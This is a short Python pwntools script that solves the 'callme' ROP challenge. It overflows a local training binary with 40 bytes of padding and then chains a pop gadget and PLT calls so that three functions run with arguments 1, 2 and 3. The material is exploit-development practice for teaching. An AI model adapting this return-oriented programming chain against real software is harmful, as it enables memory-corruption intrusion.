#!/usr/bin/env python2
from pwn import *

exe  = "./callme"

elf  = ELF(exe)

one   = elf.plt['callme_one']
two   = elf.plt['callme_two']
three = elf.plt['callme_three']

setup_stack_pop_gadget = 0x00401ab0
pop_rdi                = 0x00401b23

proc = process(exe)

log.info("One  : " + hex(one))
log.info("Two  : " + hex(two))
log.info("Three: " + hex(three))

payload =  ""
payload += "d"*40
payload += p64(setup_stack_pop_gadget)
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(one)
payload += p64(setup_stack_pop_gadget)
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(two)
payload += p64(setup_stack_pop_gadget)
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(three)

log.info("Payload Generated.")
log.info("Payload: " + payload)
with open('payload', 'wb') as f:
    f.write(payload)

proc.recv()
proc.sendline(payload)

print "RECEIVED: "
print proc.recv()
print "DONE"
